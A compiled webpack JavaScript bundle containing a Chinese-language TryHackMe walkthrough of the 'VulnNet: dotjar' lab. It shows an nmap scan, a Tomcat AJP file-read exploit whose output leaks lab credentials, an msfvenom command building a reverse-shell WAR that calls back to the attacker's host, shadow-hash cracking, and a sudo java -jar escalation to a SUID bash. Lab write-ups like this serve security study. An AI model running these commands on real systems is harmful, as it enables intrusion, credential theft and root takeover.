"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1196],{52876:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>o,toc:()=>l});var a=t(74848),r=t(28453);const s={sidebar_position:146,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","SUDO"],title:"VulnNet: dotjar",description:"VulnNet: dotjar",sidebar_label:"VulnNet: dotjar",slug:"/tryhackme/146"},i="VulnNet: dotjar",o={id:"box/TryHackMe/146",title:"VulnNet: dotjar",description:"VulnNet: dotjar",source:"@site/docs/box/TryHackMe/146.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/146",permalink:"/docs/tryhackme/146",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:146,frontMatter:{sidebar_position:146,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","SUDO"],title:"VulnNet: dotjar",description:"VulnNet: dotjar",sidebar_label:"VulnNet: dotjar",slug:"/tryhackme/146"},sidebar:"boxSidebar",previous:{title:"Unstable Twin",permalink:"/docs/tryhackme/145"},next:{title:"Napping",permalink:"/docs/tryhackme/147"}},d={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8080",id:"8080",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"web",id:"web",level:3},{value:"web \u2014&gt; jdk-admin",id:"web--jdk-admin",level:3},{value:"jdk-admin \u2014&gt; root",id:"jdk-admin--root",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"vulnnet-dotjar",children:"VulnNet: dotjar"}),"\n",(0,a.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-20-92:~# nmap -sTCV -p- --min-rate 1000 10.10.99.153\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-05 09:57 BST\nStats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan\nNSE Timing: About 0.00% done\nNmap scan report for ip-10-10-99-153.eu-west-1.compute.internal (10.10.99.153)\nHost is up (0.0054s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n| ajp-methods: \n|_  Supported methods: GET HEAD POST OPTIONS\n8080/tcp open  http    Apache Tomcat 9.0.30\n|_http-favicon: Apache Tomcat\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Apache Tomcat/9.0.30\nMAC Address: 02:FF:C1:D7:81:19 (Unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.13 seconds\n"})}),"\n",(0,a.jsx)(n.h2,{id:"8080",children:"8080"}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e\u626b\u63cf\u7ed3\u679c\u663e\u793a\u662f Apache Tomcat 9.0.30 \u5e76\u4e14\u5f00\u542f\u4e86 8009 ajp \u534f\u8bae, \u6211\u8bb0\u5f97\u8fd9\u4e2a\u642d\u914d\u662f\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u7684\u6240\u4ee5\u6211\u76f4\u63a5\u627e\u4e86 EXP \u5f00\u59cb\u5229\u7528 ",(0,a.jsx)(n.a,{href:"https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",children:"CNVD-2020-10487-Tomcat-Ajp-lfi"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-20-92:~/vulnnetdotjar/CNVD-2020-10487-Tomcat-Ajp-lfi# python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 10.10.99.153 -p 8009 -f WEB-INF/web.xml\n....\n     VulnNet Dev Regulations - mandatory\n \n1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.\n2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.\n-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.\n-- Your project scope is written in the contract.\n3. Developer access is granted with the credentials provided below:\n \n    webdev:Hgj3LA$02D$Fa@21\n \nGUI access is disabled for security reasons.\n \n4. All further instructions are delivered to your business mail address.\n5. If you have any additional questions contact our staff help branch.\n  </description>\n\n</web-app>\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4ece\u4e0a\u8ff0\u8f93\u51fa\u4e2d\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u4ee5\u4e0b\u5185\u5bb9:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsxs)(n.li,{children:["\u4e00\u4e2a\u540e\u53f0\u767b\u9646\u8d26\u53f7 : webdev",":Hgj3LA","$02D$Fa@21"]}),"\n",(0,a.jsx)(n.li,{children:"\u7981\u7528\u4e86GUI \u8bbf\u95ee, \u5982\u679c\u4f60\u5c1d\u8bd5\u4f7f\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee Tomcat \u7684\u7ba1\u7406\u9875\u9762\u4f60\u4f1a\u53d1\u73b0 403 \u800c\u4e14\u65e0\u6cd5\u7ed5\u8fc7"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u6211\u672c\u6765\u60f3\u7684\u662f\u670d\u52a1\u7aef\u57fa\u4e8e User-Agent \u7684\u68c0\u6d4b, \u4f46\u662f\u5c1d\u8bd5\u4e00\u5708\u540e\u53d1\u73b0\u6ca1\u6709\u529e\u6cd5\u7ed5\u8fc7, \u6240\u4ee5\u8f6c\u6362\u601d\u8def\u76f4\u63a5\u4f7f\u7528\u547d\u4ee4\u884c\u64cd\u4f5c\u4e0a\u4f20, \u4e07\u5e78 GPT \u544a\u8bc9\u4e86\u6211\u4e0a\u4f20\u7684 URL , \u6240\u4ee5\u521b\u5efa\u6211\u4eec\u7684 war \u6587\u4ef6\u5e76\u8fdb\u884c\u4e0a\u4f20"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-20-92:~/vulnnetdotjar# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.20.92 LPORT=4444 -f war > shell.war\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-181710.png",alt:"image-20240709181709039"})}),"\n",(0,a.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(n.h3,{id:"web",children:"web"}),"\n",(0,a.jsx)(n.p,{children:"\u5f00\u542f\u76d1\u542c\u5e76\u8fdb\u884c\u7b49\u5f85\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a Shell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-181722.png",alt:"image-20240709181721006"})}),"\n",(0,a.jsx)(n.h3,{id:"web--jdk-admin",children:"web \u2014> jdk-admin"}),"\n",(0,a.jsx)(n.p,{children:"\u5728 var \u76ee\u5f55\u4e0b\u641c\u7d22\u65f6\u6211\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u5907\u4efd\u6587\u4ef6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) web@vulnnet-dotjar:/var$ ls -al backups/\ntotal 2652\n......\n-rw-r--r--  1 root root       485 Jan 16  2021 shadow-backup-alt.gz\n.....\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6211\u731c\u6d4b\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u5b58\u5728\u7528\u6237\u7684\u5bc6\u7801, \u6240\u4ee5\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730, \u5982\u679c\u4f60\u9047\u5230\u683c\u5f0f\u9519\u8bef\u95ee\u9898, \u4e0d\u59a8\u5148\u5c06\u5176\u590d\u5236\u5230 tmp \u76ee\u5f55\u4e0b\u518d\u4e0b\u8f7d, \u89e3\u538b\u4e4b\u540e\u5176\u4e2d\u786e\u5b9e\u662f shadow \u7684\u6587\u4ef6, \u5e76\u4e14\u5176\u4e2d\u5b58\u5728 root \u3001jdk-admin\u3001 web \u7684hash \u6240\u4ee5\u89e3\u5bc6"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-181730.png",alt:"image-20240709181729087"})}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u5207\u6362\u7528\u6237\u5373\u53ef"}),"\n",(0,a.jsx)(n.h3,{id:"jdk-admin--root",children:"jdk-admin \u2014> root"}),"\n",(0,a.jsx)(n.p,{children:"\u6211\u53d1\u73b0 jdk-admin \u7528\u6237\u5b58\u5728 SUDO \u7279\u6743\u53ef\u4ee5\u6267\u884c\u6240\u6709\u7684 jar \u7a0b\u5e8f"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"jdk-admin@vulnnet-dotjar:/tmp$ sudo -l\nMatching Defaults entries for jdk-admin on vulnnet-dotjar:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jdk-admin may run the following commands on vulnnet-dotjar:\n    (root) /usr/bin/java -jar *.jar\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u8fd9\u91cc\u6211\u81ea\u5df1\u521b\u5efa\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684 jar \u5305, , \u5176\u4f5c\u7528\u662f\u5c06 /bin/bash \u8d4b\u4e88 SUID \u6743\u9650, \u5c06\u5176\u8fdb\u884c\u4e0a\u4f20\u5e76\u6267\u884c\u540e\u786e\u5b9e\u5b8c\u6210\u4e86\u4efb\u52a1"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-181739.png",alt:"image-20240709181737613"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var a=t(96540);const r={},s=a.createContext(r);function i(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);